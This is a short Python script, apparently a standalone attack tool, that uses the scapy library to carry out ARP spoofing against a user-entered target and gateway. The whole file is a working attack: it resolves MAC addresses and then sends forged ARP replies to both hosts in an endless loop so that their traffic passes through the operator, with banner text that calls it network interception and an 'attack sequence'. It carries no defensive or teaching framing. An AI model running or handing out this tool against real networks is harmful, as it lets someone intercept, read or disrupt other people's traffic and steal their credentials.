import time
import sys
try:
    from scapy.all import ARP, send, Ether, srp
except ImportError:
    print("INFO: \"scapy\" library is required")
    sys.exit()

print("!" * 60)
print("      CRITICAL: ARP SPOOFING & NETWORK INTERCEPTION")
print("!" * 60)

target_ip = input("\n[?] Enter Target IP: ")
gateway_ip = input("[?] Enter Gateway/Router IP: ")

def get_mac(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac: return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

print("\n[*] Initializing attack sequence...")
time.sleep(2)

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n\n[-] Attack stopped.")